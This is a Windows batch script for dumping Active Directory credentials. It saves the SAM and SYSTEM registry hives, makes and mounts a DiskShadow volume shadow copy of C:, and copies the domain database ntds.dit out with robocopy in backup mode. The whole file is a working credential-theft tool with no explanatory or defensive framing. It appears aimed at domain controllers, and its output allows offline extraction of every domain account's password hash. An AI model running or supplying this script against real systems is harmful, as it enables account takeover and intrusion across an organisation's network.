@echo off
setlocal EnableDelayedExpansion

REM ========================================================
REM Delete existing files in current directory to ensure a clean start
if exist "%cd%\NTDS" (
    echo [*] Existing NTDS file found. Deleting it...
    del /f /q "%cd%\NTDS"
)
if exist "%cd%\SAM" (
    echo [*] Existing SAM file found. Deleting it...
    del /f /q "%cd%\SAM"
)
if exist "%cd%\SYSTEM" (
    echo [*] Existing SYSTEM file found. Deleting it...
    del /f /q "%cd%\SYSTEM"
)
if exist "%cd%\ntds.dit" (
    echo [*] Existing ntds.dit file found. Deleting it...
    del /f /q "%cd%\ntds.dit"
)
echo.

REM ========================================================
REM Save registry hives
echo [*] Saving registry hives...
reg save HKLM\SAM "%cd%\SAM"
reg save HKLM\SYSTEM "%cd%\SYSTEM"
echo [+] Registry hives saved successfully.
echo.

REM ========================================================
REM Ensure NTDS directory exists on the system
if not exist "C:\Windows\ntds" (
    echo [!] NTDS directory not found. Exiting.
    goto :EOF
)
echo [*] NTDS directory detected.
echo.

REM ========================================================
REM Define drive letters (from Z to A) separated by spaces
set "letters=Z Y X W V U T S R Q P O N M L K J I H G F E D C B A"
set shadowCreated=0

for %%L in (%letters%) do (
    REM Check if drive letter %%L: is in use
    if exist "%%L:\" (
        echo [-] Drive letter %%L is already in use. Skipping.
    ) else (
        echo [*] Attempting DiskShadow with drive letter %%L...

        REM Create the temporary DiskShadow script (shadow.dsh)
        (
            echo set context persistent nowriters
            echo set metadata C:\Windows\Temp\file.cab
            echo add volume C: alias mydrive
            echo create
            REM Use ^ to escape % so that the literal "%mydrive%" is written
            echo expose ^%%mydrive%%^ %%L:
        ) > shadow.dsh
        echo [+] DiskShadow script created with drive letter %%L.
        echo.

        REM Run DiskShadow and capture output to diskshadow_output.txt
        diskshadow /s shadow.dsh > diskshadow_output.txt 2>&1
        echo [*] DiskShadow output for drive %%L:
        type diskshadow_output.txt
        echo.

        REM Check if shadow copy was successfully created (i.e., NTDS directory exists on exposed drive)
        if exist "%%L:\Windows\ntds" (
            echo [+] Shadow copy successfully created on drive %%L:
            echo [*] Copying ntds.dit using Robocopy...
            robocopy /b "%%L:\Windows\ntds" "%cd%" ntds.dit /log:"robocopy.log" /v
            echo [+] Robocopy operation completed. Check robocopy.log for details.
            echo.

            if exist "%cd%\ntds.dit" (
                echo [*] Renaming ntds.dit to NTDS...
                ren "%cd%\ntds.dit" NTDS
                echo [+] File successfully renamed to NTDS.
            ) else (
                echo [!] Failed to copy or rename NTDS.
            )
            echo.
            del shadow.dsh
            set shadowCreated=1
            goto :endLoop
        ) else (
            echo [!] Shadow copy not available on drive %%L. Trying next available drive...
            del shadow.dsh
            echo.
        )
    )
)

:endLoop
if "%shadowCreated%"=="1" (
    echo [*] Operation completed successfully.
) else (
    echo [!] No shadow copy could be created on any available drive letter.
)

pause
endlocal